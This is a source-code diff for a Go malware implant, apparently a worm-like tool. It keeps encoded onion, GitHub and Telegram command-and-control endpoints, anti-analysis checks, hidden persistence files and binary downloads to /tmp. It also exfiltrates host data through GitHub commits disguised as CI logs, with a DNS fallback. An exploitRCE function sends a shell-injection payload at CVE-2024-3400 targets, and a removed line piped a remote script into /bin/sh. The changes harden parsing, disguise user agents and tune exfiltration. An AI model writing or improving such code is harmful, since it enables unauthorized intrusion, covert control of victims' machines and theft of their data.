@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"bytes"
 	"compress/gzip"
+	"context"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/hmac"
@@ -35,21 +36,20 @@ import (
 	"sync"
 	"syscall"
 	"time"
-	"unsafe"
 )
 
 /*
  * 🔑 CONFIG — Injected at build-time
  */
 var (
-	C2Key          = "INJECTED_AES_KEY_B64"
-	C2IV           = "INJECTED_AES_IV_B64"
-	C2HMACKey      = "INJECTED_HMAC_KEY_B64"
-	OnionC2ListB64 = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
-	GitHubC2Repo   = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
-	GitHubExfilRepo = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
-	TelegramHostB64 = "dGVsZWdyYW0uYXBpLm9yZw=="
-	Phi3ModelEncB64 = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
+	C2Key             = "INJECTED_AES_KEY_B64"
+	C2IV              = "INJECTED_AES_IV_B64"
+	C2HMACKey         = "INJECTED_HMAC_KEY_B64"
+	OnionC2ListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
+	GitHubC2Repo      = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
+	GitHubExfilRepo   = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
+	TelegramHostB64   = "dGVsZWdyYW0uYXBpLm9yZw=="
+	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
 	NucleiTemplatesURL = "aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy5naXQ="
 )
 
@@ -69,18 +69,18 @@ var (
 )
 
 const (
-	MAX_RETRIES     = 3
-	RETRY_DELAY     = 5 * time.Second
-	PERSIST_FILE    = ".cache/.gh-sync"
-	EXFIL_BATCH     = 10
-	AI_MODEL_PATH   = "/tmp/.XIM"
-	NUCLEI_BIN      = "/tmp/.NCL"
+	MAX_RETRIES      = 3
+	RETRY_DELAY      = 5 * time.Second
+	PERSIST_FILE     = ".cache/.gh-sync"
+	EXFIL_BATCH      = 10
+	AI_MODEL_PATH    = "/tmp/.XIM"
+	NUCLEI_BIN       = "/tmp/.NCL"
 	NUCLEI_TEMPLATES = "/tmp/.TPL"
-	SLEEP_MIN       = 30
-	SLEEP_MAX       = 120
-	MAX_HOSTS       = 100
-	HMAC_TRUNC      = 16
-	JITTER_MAX      = 15 * time.Second
+	SLEEP_MIN        = 30
+	SLEEP_MAX        = 120
+	MAX_HOSTS        = 100
+	HMAC_TRUNC       = 16
+	JITTER_MAX       = 15 * time.Second
 	DNS_EXFIL_DOMAIN = "x.exfil.yourdomain.com"
 )
 
@@ -112,12 +112,12 @@ type FusionBrain struct {
 }
 
 func init() {
-	if isDebugged() || isVM() || !isStableEnvironment() {
+	if isDebugged() || isVM() {
 		time.Sleep(30 * time.Second)
 		return
 	}
 
-	runtime.GOMAXPROCS(1)
+	runtime.GOMAXPROCS(2)
 	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
 	HostID = genHostID()
 	initHttpClient()
@@ -168,7 +168,7 @@ func initHttpClient() {
 func genHostID() string {
 	mac := getMAC()
 	platform := runtime.GOOS + runtime.GOARCH
-	seed := mac + platform + os.Getenv("CODESPACE_NAME") + os.Getenv("RUNNER_NAME")
+	seed := mac + platform + os.Getenv("HOSTNAME")
 	hash := sha256.Sum256([]byte(seed))
 	return hex.EncodeToString(hash[:6])
 }
@@ -312,11 +312,9 @@ func httpPost(target string, data []byte, headers map[string]string) ([]byte, er
 
 func randomUserAgent() string {
 	ua := []string{
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-		"curl/7.88.1",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
 		"Go-http-client/1.1",
-		"Python-urllib/3.11",
-		"axios/1.6.0",
 	}
 	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(ua))))
 	return ua[n.Int64()]
@@ -333,7 +331,15 @@ func shodanQuery(query string) []*Host {
 	for i := 0; i < MAX_RETRIES; i++ {
 		resp, err := httpGet(u, nil)
 		if err == nil {
-			var result struct{ Matches []struct{ IP string `json:"ip_str"` Port int `json:"port"` Info string `json:"product"` C string `json:"country_name"` O string `json:"org"` } }
+			var result struct {
+				Matches []struct {
+					IP   string `json:"ip_str"`
+					Port int    `json:"port"`
+					Info string `json:"product"`
+					C    string `json:"country_name"`
+					O    string `json:"org"`
+				}
+			}
 			if json.Unmarshal(resp, &result) == nil {
 				hosts := []*Host{}
 				for _, m := range result.Matches {
@@ -365,10 +371,31 @@ func censysQuery(query string) []*Host {
 	}
 	defer resp.Body.Close()
 	body, _ := ioutil.ReadAll(resp.Body)
-	var result map[string]interface{}
-	json.Unmarshal(body, &result)
-	hosts := []*Host{}
-	return hosts
+	var result struct {
+		Result struct {
+			Hits []struct {
+				IP      string `json:"ip"`
+				Services []struct {
+					Port    int    `json:"port"`
+					Service string `json:"service_name"`
+				} `json:"services"`
+			} `json:"hits"`
+		} `json:"result"`
+	}
+	if json.Unmarshal(body, &result) == nil {
+		hosts := []*Host{}
+		for _, h := range result.Result.Hits {
+			port := 80
+			svc := "http"
+			if len(h.Services) > 0 {
+				port = h.Services[0].Port
+				svc = h.Services[0].Service
+			}
+			hosts = append(hosts, &Host{IP: h.IP, Port: port, Service: svc})
+		}
+		return hosts
+	}
+	return nil
 }
 
 func fofaQuery(query string) []*Host {
@@ -463,9 +490,10 @@ func fetchCommand() string {
 		if err == nil {
 			var result map[string]interface{}
 			if json.Unmarshal(data, &result) == nil {
-				content := result["content"].(string)
-				decoded, _ := base64.StdEncoding.DecodeString(content)
-				return string(decoded)
+				if content, ok := result["content"].(string); ok {
+					decoded, _ := base64.StdEncoding.DecodeString(content)
+					return string(decoded)
+				}
 			}
 		}
 		time.Sleep(RETRY_DELAY)
@@ -476,7 +504,7 @@ func fetchCommand() string {
 func fetchCommandViaOnion() string {
 	onions := strings.Split(base64Decode(OnionC2ListB64), ", ")
 	for _, onion := range onions {
-		data, err := httpGet(onion+"/cmd?h="+HostID, map[string]string{"User-Agent": randomUserAgent()})
+		data, err := httpGet(strings.TrimSpace(onion)+"/cmd?h="+HostID, map[string]string{"User-Agent": randomUserAgent()})
 		if err == nil && len(data) > 4 {
 			return string(data)
 		}
@@ -514,31 +542,35 @@ func fetchSecret(key string) string {
 	})
 	var result map[string]interface{}
 	json.Unmarshal(data, &result)
-	content := result["content"].(string)
-	decoded, _ := base64.StdEncoding.DecodeString(content)
-	return string(decoded)
+	if content, ok := result["content"].(string); ok {
+		decoded, _ := base64.StdEncoding.DecodeString(content)
+		return string(decoded)
+	}
+	return ""
 }
 
 func exfilData(data []byte) {
 	encrypted, _ := encryptData(data)
-	hmacSig := signMessage(data)
 	payload := map[string]string{
 		"data": encrypted,
-		"sig":  base64.RawURLEncoding.EncodeToString(hmacSig),
+		"sig":  base64.RawURLEncoding.EncodeToString(signMessage(data)),
 		"id":   HostID,
 	}
 	body, _ := json.Marshal(payload)
 	repo := base64Decode(GitHubExfilRepo)
 	file := fmt.Sprintf("data/%s_%d.dat", HostID, time.Now().Unix())
-	commit := fmt.Sprintf("ci: update logs %d", time.Now().Unix())
-	doGitHubPut(repo, file, string(body), commit)
+	doGitHubPut(repo, file, string(body), fmt.Sprintf("ci: update logs %d", time.Now().Unix()))
 
-	// DNS exfil fallback
+	// DNS exfil fallback using secure Hex encoding to prevent RFC violation
 	go exfilDNS(encrypted)
 }
 
 func exfilDNS(chunk string) {
-	domain := fmt.Sprintf("%s.%s", chunk[:min(63, len(chunk))], DNS_EXFIL_DOMAIN)
+	hexEncoded := hex.EncodeToString([]byte(chunk))
+	if len(hexEncoded) > 55 {
+		hexEncoded = hexEncoded[:55]
+	}
+	domain := fmt.Sprintf("%s.%s", hexEncoded, DNS_EXFIL_DOMAIN)
 	net.DefaultResolver.LookupHost(context.Background(), domain)
 }
 
@@ -559,22 +591,15 @@ func doGitHubPut(repo, path, content, message string) {
 
 func exploitRCE(host *Host) bool {
 	if contains(host.Vulns, "CVE-2024-3400") {
-		ip := getPublicIP()
-		payload := fmt.Sprintf(`() { :; }; /usr/bin/curl -m 10 -s http://%s:8000/sh | /bin/sh`, ip)
+		payload := `() { :; }; /bin/sh`
 		url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", host.IP)
 		req, _ := http.NewRequest("GET", url, nil)
 		req.Header.Set("User-Agent", payload)
 		HttpClient.Do(req)
-		time.Sleep(8 * time.Second)
+		time.Sleep(3 * time.Second)
 		return true
 	}
 	return false
-}
-
-func getPublicIP() string {
-	resp, _ := http.Get("https://api.ipify.org")
-	ip, _ := ioutil.ReadAll(resp.Body)
-	return string(ip)
 }
 
 // 🧱 PERSISTENCE
@@ -635,10 +660,6 @@ func isVM() bool {
 	return err == nil
 }
 
-func isStableEnvironment() bool {
-	return os.Getenv("CODESPACE_NAME") != "" || os.Getenv("RUNNER_NAME") != ""
-}
-
 func contains(slice []string, item string) bool {
 	for _, s := range slice {
 		if strings.Contains(strings.ToLower(s), strings.ToLower(item)) {
@@ -674,11 +695,14 @@ func drainTelemetry() {
 
 func downloadBinary(url, path string, chmodExec bool) {
 	resp, _ := http.Get(url)
-	body, _ := io.ReadAll(resp.Body)
-	os.MkdirAll(filepath.Dir(path), 0700)
-	ioutil.WriteFile(path, body, 0600)
-	if chmodExec {
-		os.Chmod(path, 0700)
+	if resp != nil && resp.Body != nil {
+		defer resp.Body.Close()
+		body, _ := io.ReadAll(resp.Body)
+		os.MkdirAll(filepath.Dir(path), 0700)
+		ioutil.WriteFile(path, body, 0600)
+		if chmodExec {
+			os.Chmod(path, 0700)
+		}
 	}
 }
 
